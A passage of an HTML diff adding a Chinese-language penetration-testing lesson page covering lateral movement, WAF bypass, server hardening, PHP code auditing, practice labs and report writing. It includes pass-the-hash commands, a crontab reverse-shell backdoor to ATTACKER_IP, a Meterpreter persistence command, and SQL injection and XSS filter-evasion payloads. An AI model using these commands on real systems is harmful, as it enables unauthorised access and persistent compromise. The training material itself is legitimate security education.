+<span class="cm"># ─── Pass-the-Hash（Hash 傳遞攻擊）───</span>
+<span class="cm"># 使用竊取的 NTLM Hash 而非明文密碼認證</span>
+pth-winexe -U 'WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:HASH' \
+  //192.168.2.100 cmd.exe
+
+<span class="cm"># impacket 工具集（橫向移動神器）</span>
+python psexec.py administrator@192.168.2.100 -hashes :NTLM_HASH
+python wmiexec.py administrator@192.168.2.100 -hashes :NTLM_HASH
+
+<span class="cm"># ─── 持久化後門 ───</span>
+<span class="cm"># Linux：添加 crontab 計劃任務</span>
+(crontab -l; echo "* * * * * /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1") | crontab -
+
+<span class="cm"># Windows：添加服務或計劃任務</span>
+meterpreter> run post/windows/manage/persistence_exe STARTUP=SCHEDULER</pre>
+</div>
+</div>
+
+<!-- ===== CH9: WAF 繞過 ===== -->
+<div class="cb" id="l9-1">
+<h2>WAF 識別與常用繞過技術</h2>
+<p>WAF（Web Application Firewall）是 Web 應用的主要防禦設備。滲透測試中常需要繞過 WAF 才能成功測試或利用漏洞。</p>
+
+<h3>WAF 識別方法</h3>
+<div class="cblock">
+  <div class="ctop"><span class="clang">WAF 識別與繞過技術集合</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── WAF 識別 ───</span>
+wafw00f https://target.com             <span class="cm"># 自動識別 WAF 類型</span>
+<span class="cm"># 手工識別：發送 /etc/passwd → 觀察攔截頁面的特徵文字</span>
+
+<span class="cm"># ─── SQL 注入 WAF 繞過 ───</span>
+<span class="cm"># 1. 大小寫混淆</span>
+sElEcT * FrOm users
+
+<span class="cm"># 2. 注釋符分割</span>
+SEL/**/ECT * FR/**/OM users
+SELECT/*!32302*/user,password FROM users
+
+<span class="cm"># 3. URL 雙重編碼</span>
+%27 → '   (一次解碼)
+%2527 → %27 → '   (二次解碼，繞過單次 URL 解碼的 WAF)
+
+<span class="cm"># 4. 換行 / Tab 替換空格</span>
+SELECT%09user%09FROM%09users
+SELECT%0auser%0aFROM%0ausers
+
+<span class="cm"># 5. 科學計數法繞過數字過濾</span>
+id=1e0+UNION+SELECT...  <span class="cm"># 1e0 = 1.0 = 1</span>
+
+<span class="cm"># ─── XSS WAF 繞過 ───</span>
+&lt;ScRiPt&gt;alert(1)&lt;/sCriPT&gt;           <span class="cm"># 大小寫</span>
+&lt;sCrIpT/src=//attacker.com/x.js&gt;    <span class="cm"># 加斜線</span>
+&lt;img src=x onerror="\u0061lert(1)"&gt;  <span class="cm"># Unicode 繞過關鍵字</span>
+
+<span class="cm"># ─── sqlmap WAF 繞過 ───</span>
+sqlmap -u "URL" --dbs --random-agent --delay=2 \
+  --tamper=space2comment,randomcase,between,charencode</pre>
+</div>
+</div>
+
+<!-- L9-2 安全加固 -->
+<div class="cb" id="l9-2">
+<h2>Nginx / Apache 安全加固</h2>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">Web 服務器安全加固配置</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── Nginx 安全配置 ───</span>
+server {
+    <span class="cm"># 隱藏版本信息</span>
+    server_tokens off;
+
+    <span class="cm"># 安全 HTTP Headers</span>
+    add_header X-Frame-Options "DENY";
+    add_header X-Content-Type-Options "nosniff";
+    add_header X-XSS-Protection "1; mode=block";
+    add_header Content-Security-Policy "default-src 'self'";
+    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains";
+
+    <span class="cm"># 禁止訪問敏感文件</span>
+    location ~ /\.(git|svn|env|htaccess) {
+        deny all;
+        return 404;
+    }
+
+    <span class="cm"># 限制上傳文件大小</span>
+    client_max_body_size 5m;
+}
+
+<span class="cm"># ─── PHP 安全配置（php.ini）───</span>
+display_errors = Off          <span class="cm"># 關閉錯誤顯示</span>
+log_errors = On               <span class="cm"># 開啟錯誤日誌</span>
+allow_url_include = Off       <span class="cm"># 禁止遠程文件包含（防 RFI）</span>
+allow_url_fopen = Off         <span class="cm"># 禁止遠程文件讀取</span>
+disable_functions = exec,system,shell_exec,passthru,eval  <span class="cm"># 禁用危險函數</span>
+expose_php = Off              <span class="cm"># 隱藏 PHP 版本</span>
+session.cookie_httponly = 1   <span class="cm"># Cookie HttpOnly（防 XSS 竊取）</span>
+session.cookie_secure = 1     <span class="cm"># Cookie 僅 HTTPS 傳輸</span></pre>
+</div>
+</div>
+
+<!-- ===== CH10: 源碼審計 / 報告 ===== -->
+<div class="cb" id="l10-1">
+<h2>PHP 源碼審計方法與實戰</h2>
+<p>源碼審計（Code Review）是從開發者角度發現安全漏洞，是白盒測試的核心技能。掌握源碼審計能找到掃描器和黑盒測試無法發現的深層漏洞。</p>
+
+<h3>源碼審計方法論</h3>
+<div class="atkflow">
+  <div class="af-step s1"><span class="af-n">STEP1</span><div><div class="af-t">通讀框架結構</div><div class="af-d">了解框架目錄結構、路由機制、中間件，尋找入口文件（index.php）和核心配置文件（config.php）</div></div></div>
+  <div class="af-step s2"><span class="af-n">STEP2</span><div><div class="af-t">追蹤危險函數</div><div class="af-d">全局搜索危險函數（eval/system/exec/include/unserialize/mysql_query 等），逆向追蹤參數來源，判斷是否可控且未過濾</div></div></div>
+  <div class="af-step s3"><span class="af-n">STEP3</span><div><div class="af-t">檢查輸入點過濾</div><div class="af-d">審查所有超全局變數（$_GET/$_POST/$_REQUEST）的處理邏輯，有無遺漏的過濾點</div></div></div>
+  <div class="af-step s4"><span class="af-n">STEP4</span><div><div class="af-t">業務邏輯分析</div><div class="af-d">審查認證、授權、支付等業務邏輯代碼，尋找條件競爭、繞過邏輯等問題</div></div></div>
+</div>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">源碼審計 — 快速發現漏洞的搜索技巧</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── 在源碼目錄中搜索危險模式 ───</span>
+
+<span class="cm"># 搜索所有 eval 使用（潛在代碼執行）</span>
+grep -r "eval(" . --include="*.php" -l
+
+<span class="cm"># 搜索所有 SQL 字串拼接（潛在 SQL 注入）</span>
+grep -r "WHERE.*\$" . --include="*.php" | grep -v "prepare\|bindParam"
+
+<span class="cm"># 搜索所有文件包含（潛在 LFI）</span>
+grep -r "include\|require" . --include="*.php" | grep "\$"
+
+<span class="cm"># 搜索所有反序列化（潛在反序列化漏洞）</span>
+grep -r "unserialize" . --include="*.php"
+
+<span class="cm"># 搜索所有系統命令執行</span>
+grep -r "system\|exec\|passthru\|shell_exec\|popen" . --include="*.php" | grep "\$"
+
+<span class="cm"># ─── RIPS / phpcs 自動化掃描 ───</span>
+<span class="cm"># RIPS：商業 PHP 靜態代碼分析工具</span>
+<span class="cm"># phpcs：PHP Code Sniffer，可配置安全規則集</span>
+phpcs --standard=Security /var/www/html/ -v</pre>
+</div>
+</div>
+
+<!-- L10-2 靶機 -->
+<div class="cb" id="l10-2">
+<h2>靶機通關：DC 系列 / HackTheBox</h2>
+<p>所有技術的學習最終都要通過實戰來鞏固。靶機平台提供合法的真實滲透體驗，是提升技術水平的最快途徑。</p>
+
+<div class="tbl">
+  <table class="t">
+    <thead><tr><th>平台</th><th>特點</th><th>適合程度</th></tr></thead>
+    <tbody>
+      <tr><td><strong>DVWA</strong></td><td>本地靶機，覆蓋 SQL 注入/XSS/CSRF/上傳/命令注入，有難度級別</td><td>★★ 入門必做</td></tr>
+      <tr><td><strong>WebGoat (OWASP)</strong></td><td>帶學習教程的靶機，每個漏洞有詳細說明，適合理論+實戰結合</td><td>★★ 入門</td></tr>
+      <tr><td><strong>Vulhub</strong></td><td>Docker 靶場，包含真實 CVE 漏洞環境（Log4j/Shiro/Struts2等）</td><td>★★★ 中階</td></tr>
+      <tr><td><strong>DC 系列（1-9）</strong></td><td>VulnHub 上的免費虛擬機靶機，難度遞進，配合 Google 可找到 Writeup</td><td>★★★ 中階</td></tr>
+      <tr><td><strong>HackTheBox</strong></td><td>在線平台，有 Active/Retired 兩類機器，Retired 有官方 Writeup，社區活躍</td><td>★★★★ 進階</td></tr>
+      <tr><td><strong>TryHackMe</strong></td><td>有引導式學習路徑，適合初學者，大量免費靶機</td><td>★★★ 中階</td></tr>
+      <tr><td><strong>CTFtime.org</strong></td><td>全球 CTF 賽事日曆，Web 類題目是最好的 XSS/SQLi 提升方式</td><td>★★★★ 進階</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="note tip">
+  <div class="note-lbl">靶機通關學習策略</div>
+  <p>推薦路線：DVWA（所有漏洞基礎）→ Vulhub（真實 CVE）→ DC 系列 1-5（綜合滲透）→ TryHackMe 學習路徑 → HackTheBox Easy 機器。每台機器先嘗試 <strong>1-2小時</strong>，卡住了看 Writeup，但要自己動手复現每一步。「看懂」和「做出來」是完全不同的能力。</p>
+</div>
+</div>
+
+<!-- L10-3 報告 -->
+<div class="cb" id="l10-3">
+<h2>滲透測試報告撰寫規範</h2>
+<p>一份高品質的滲透測試報告是你的專業體現，也是客戶最終能看到的工作成果。報告的品質直接影響客戶對工程師能力的評價。</p>
+
+<h3>報告結構</h3>
+<div class="ilist">
+  <div class="il-item"><span class="il-num">01</span><div class="il-txt"><strong>執行摘要（Executive Summary）</strong> — 給管理層看。用非技術語言總結整體安全狀況、最嚴重的發現、整體風險評級、關鍵建議。通常 1-2 頁。</div></div>
+  <div class="il-item"><span class="il-num">02</span><div class="il-txt"><strong>測試範圍與方法</strong> — 說明測試的系統範圍、測試類型（黑/白/灰盒）、測試時間、使用的方法論框架（PTES/OWASP）、工具列表</div></div>
+  <div class="il-item"><span class="il-num">03</span><div class="il-txt"><strong>漏洞詳情（技術報告核心）</strong> — 每個漏洞一頁，包含：漏洞名稱、CVSS 評分、受影響系統、漏洞描述、复現步驟（含截圖）、業務影響、修復建議</div></div>
+  <div class="il-item"><span class="il-num">04</span><div class="il-txt"><strong>風險匯總表</strong> — 所有漏洞的 Excel 表格，按嚴重性（Critical/High/Medium/Low/Info）分類，方便客戶跟蹤修復進度</div></div>
+  <div class="il-item"><span class="il-num">05</span><div class="il-txt"><strong>附錄</strong> — 完整的命令輸出、Burp 截圖、Nmap 掃描結果等原始數據</div></div>
+</div>
+
+<h3>CVSS 風險評分快速參考</h3>
+<div class="tbl">
+  <table class="t">
+    <thead><tr><th>評分範圍</th><th>嚴重程度</th><th>典型漏洞舉例</th></tr></thead>
+    <tbody>
+      <tr><td class="mc" style="color:var(--red)">9.0 - 10.0</td><td><strong>Critical（嚴重）</strong></td><td>RCE 無需認證、SQL 注入可獲取所有數據、Log4Shell</td></tr>
+      <tr><td class="mc" style="color:var(--org)">7.0 - 8.9</td><td><strong>High（高危）</strong></td><td>需認證的 RCE、SQL 注入（有回顯）、垂直越權</td></tr>
+      <tr><td class="mc" style="color:var(--ylw)">4.0 - 6.9</td><td><strong>Medium（中危）</strong></td><td>存儲型 XSS、CSRF、水平越權、目錄遍歷</td></tr>
+      <tr><td class="mc" style="color:var(--grn)">0.1 - 3.9</td><td><strong>Low（低危）</strong></td><td>反射型 XSS（需交互）、信息洩露（版本號）、弱密碼策略</td></tr>
+      <tr><td class="mc">0.0</td><td><strong>Info（信息）</strong></td><td>版本信息洩露、不必要的 HTTP 方法開放、缺少安全 Header</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="done-banner">
+  <h3>🏆 Stage 04 完成！Web 滲透測試核心掌握！</h3>
+  <p>恭喜！你已完成最核心、最重要的 Stage 4 學習。涵蓋了 SQL 注入、XSS、文件上傳、SSRF、命令注入、MSF 後滲透、WAF 繞過、源碼審計等完整技術體系。繼續進入專項方向的學習！</p>
+  <div class="btn-row">
+    <a href="stage5.html" class="btn-p">前往第五階段：Android 移動安全</a>
+    <a href="stage3.html" class="btn-g">回顧第三階段</a>
+    <a href="index.html" class="btn-g">返回課程首頁</a>
+  </div>
+</div>
+
+</div><!-- /cw -->
+
+<!-- ===== LESSON NAV ===== -->
+<div class="lnav">
+  <button class="lb" id="prevb" onclick="prevL()" disabled>&#8592; 上一課</button>
+  <div class="ln-mid">
+    <div class="ln-cnt" id="cnt">1 / 32</div>
+    <div class="ln-sub" id="lsub">滲透測試方法論</div>
+  </div>
+  <button class="lb pri" id="nextb" onclick="nextL()">下一課 &#8594;</button>
+</div>
+
+</main>
+</div><!-- /layout -->
+
+<script>
+const LS=[
+  {id:'l1-1',ch:'CH1',title:'滲透測試方法論（PTES / OWASP）',time:'20分鐘',type:'方法論'},
+  {id:'l1-2',ch:'CH1',title:'Burp Suite 完整使用指南',time:'30分鐘',type:'核心工具'},
+  {id:'l1-3',ch:'CH1',title:'情報收集：資產發現與子域名枚舉',time:'25分鐘',type:'Recon'},
+  {id:'l1-4',ch:'CH1',title:'指紋識別與漏洞掃描',time:'20分鐘',type:'信息收集'},
+  {id:'l2-1',ch:'CH2',title:'SQL 注入原理與手工測試',time:'30分鐘',type:'SQLi 基礎'},
+  {id:'l2-2',ch:'CH2',title:'聯合查詢注入 / 報錯注入',time:'30分鐘',type:'SQLi 進階'},
+  {id:'l2-3',ch:'CH2',title:'布林盲注 / 時間盲注',time:'35分鐘',type:'SQLi 盲注'},
+  {id:'l2-4',ch:'CH2',title:'sqlmap 自動化利用與繞過',time:'25分鐘',type:'自動化工具'},
+  {id:'l3-1',ch:'CH3',title:'XSS 三大類型與利用原理',time:'25分鐘',type:'XSS 基礎'},
+  {id:'l3-2',ch:'CH3',title:'XSS 過濾繞過技巧',time:'25分鐘',type:'XSS 進階'},
+  {id:'l3-3',ch:'CH3',title:'BeEF 框架：瀏覽器控制攻擊',time:'20分鐘',type:'XSS 利用'},
+  {id:'l4-1',ch:'CH4',title:'文件上傳漏洞全面剖析',time:'20分鐘',type:'上傳基礎'},
+  {id:'l4-2',ch:'CH4',title:'文件上傳繞過技巧（黑白名單）',time:'25分鐘',type:'上傳繞過'},
+  {id:'l4-3',ch:'CH4',title:'文件包含漏洞（LFI / RFI）',time:'25分鐘',type:'文件包含'},
+  {id:'l5-1',ch:'CH5',title:'SSRF 伺服器端請求偽造',time:'25分鐘',type:'SSRF'},
+  {id:'l5-2',ch:'CH5',title:'XXE XML 外部實體注入',time:'20分鐘',type:'XXE'},
+  {id:'l5-3',ch:'CH5',title:'反序列化漏洞原理與利用',time:'30分鐘',type:'反序列化'},
+  {id:'l6-1',ch:'CH6',title:'CSRF 跨站請求偽造',time:'20分鐘',type:'CSRF'},
+  {id:'l6-2',ch:'CH6',title:'業務邏輯漏洞',time:'25分鐘',type:'邏輯漏洞'},
+  {id:'l6-3',ch:'CH6',title:'越權漏洞（水平 / 垂直）',time:'20分鐘',type:'越權'},
+  {id:'l7-1',ch:'CH7',title:'OS 命令注入（RCE）',time:'25分鐘',type:'命令注入'},
+  {id:'l7-2',ch:'CH7',title:'常見框架 RCE 漏洞（Shiro/Log4j）',time:'30分鐘',type:'框架漏洞'},
+  {id:'l7-3',ch:'CH7',title:'Webshell 管理工具',time:'20分鐘',type:'後門管理'},
+  {id:'l8-1',ch:'CH8',title:'Metasploit Framework 全面入門',time:'35分鐘',type:'MSF 基礎'},
+  {id:'l8-2',ch:'CH8',title:'Meterpreter 後滲透操作',time:'35分鐘',type:'後滲透'},
+  {id:'l8-3',ch:'CH8',title:'提權技術（Linux / Windows）',time:'40分鐘',type:'提權'},
+  {id:'l8-4',ch:'CH8',title:'內網橫向移動與持久化',time:'35分鐘',type:'內網滲透'},
+  {id:'l9-1',ch:'CH9',title:'WAF 識別與常用繞過技術',time:'30分鐘',type:'WAF 繞過'},
+  {id:'l9-2',ch:'CH9',title:'Nginx / Apache 安全加固',time:'20分鐘',type:'防禦加固'},
+  {id:'l10-1',ch:'CH10',title:'PHP 源碼審計方法與實戰',time:'40分鐘',type:'代碼審計'},
+  {id:'l10-2',ch:'CH10',title:'靶機通關：DC 系列 / HackTheBox',time:'實戰',type:'綜合實戰'},
+  {id:'l10-3',ch:'CH10',title:'滲透測試報告撰寫規範',time:'20分鐘',type:'報告撰寫'},
+];
+
+const done=new Set(JSON.parse(localStorage.getItem('s4_done')||'[]'));
+let cur=0;
+
+function go(id,btn){
+  document.querySelectorAll('.cb').forEach(b=>b.classList.remove('on'));
+  document.querySelectorAll('.ls-btn').forEach(b=>b.classList.remove('lact'));
+  const bl=document.getElementById(id);
+  if(bl)bl.classList.add('on');
+  if(btn)btn.classList.add('lact');
+  cur=LS.findIndex(l=>l.id===id);
+  syncUI();
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+function toggleCh(btn,id){
+  btn.classList.toggle('copen');
+  const l=document.getElementById(id);
+  if(l)l.classList.toggle('lopen');
+}
+function prevL(){if(cur>0)findAndGo(LS[cur-1].id);}
+function nextL(){
+  done.add(LS[cur].id);
+  localStorage.setItem('s4_done',JSON.stringify([...done]));
+  if(cur<LS.length-1)findAndGo(LS[cur+1].id);
+}
+function findAndGo(id){
+  let btn=null;
+  document.querySelectorAll('.ls-btn').forEach(b=>{
+    const oc=b.getAttribute('onclick')||'';
+    if(oc.includes("'"+id+"'")){
+      btn=b;
+      let p=b.parentElement;
+      if(p&&!p.classList.contains('lopen')){
+        p.classList.add('lopen');
+        const cb=p.previousElementSibling;
+        if(cb)cb.classList.add('copen');
+      }
+    }
+  });
+  go(id,btn);
+}
+function syncUI(){
+  const l=LS[cur];if(!l)return;
+  document.getElementById('crumb').innerHTML=`STAGE 04 &gt; ${l.ch} &gt; <em>${l.title}</em>`;
+  document.getElementById('ltitle').textContent=l.title;
+  document.getElementById('chip1').textContent=l.type;
+  document.getElementById('chip2').textContent=`預計 ${l.time}`;
+  document.getElementById('cnt').textContent=`${cur+1} / ${LS.length}`;
+  document.getElementById('lsub').textContent=l.title;
+  document.getElementById('prevb').disabled=cur===0;
+  document.getElementById('nextb').disabled=cur===LS.length-1;
+  if(cur===LS.length-1){document.getElementById('nextb').textContent='Stage 完成';}
+  else{document.getElementById('nextb').innerHTML='下一課 &#8594;';}
+  const pct=done.size?Math.round(done.size/LS.length*100):0;
+  document.getElementById('pct').textContent=pct+'%';
+  document.getElementById('pf').style.width=pct+'%';
+  document.querySelectorAll('.ls-btn').forEach(b=>{
+    const oc=b.getAttribute('onclick')||'';
+    const m=oc.match(/'(l\d+-\d+)'/);
+    if(m&&done.has(m[1])&&!b.classList.contains('lact'))b.classList.add('ldone');
+  });
+}
+function chkQ(el,correct){
+  const box=el.closest('.quiz');
+  if(box.dataset.answered)return;
+  box.dataset.answered='1';
+  box.querySelectorAll('.qo').forEach(o=>o.style.pointerEvents='none');
+  el.classList.add(correct?'ok':'bad');
+  if(!correct)box.querySelectorAll('.qo').forEach(o=>{
+    if(o.getAttribute('onclick')&&o.getAttribute('onclick').includes('true'))o.classList.add('ok');
+  });
+  const exp=box.querySelector('.q-exp');
+  if(exp)exp.classList.add('on');
+}
+function cpCode(btn){
+  const pre=btn.closest('.cblock').querySelector('pre');
+  navigator.clipboard.writeText(pre.innerText).then(()=>{
+    btn.textContent='已複製';
+    setTimeout(()=>btn.textContent='複製',2000);
+  });
+}
+syncUI();
+</script>
+</body>
+</html>
